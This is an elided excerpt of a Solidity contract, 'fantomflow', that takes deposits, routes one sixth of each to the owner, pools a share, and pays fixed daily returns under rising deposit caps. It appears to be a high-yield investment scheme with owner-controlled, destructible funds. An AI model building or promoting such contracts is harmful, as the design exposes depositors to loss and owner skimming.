...
/*! fantomflow.sol | (c) 2022 Develop by BelovITLab LLC (smartcontract.ru), author @stupidlovejoy | SPDX-License-Identifier: MIT License */
...
contract fantomflow is Ownable, Destructible, Pausable {
    ...
    constructor() public {
        ...
        cycles.push(8000 ether);
        cycles.push(12000 ether);
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        else require(_amount >= 150 ether && _amount <= cycles[0], "Bad amount");
        ...
        payable(owner()).transfer(_amount / 6);
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount / 25;
    ...
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        ...
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 200) - users[_addr].deposit_payouts;
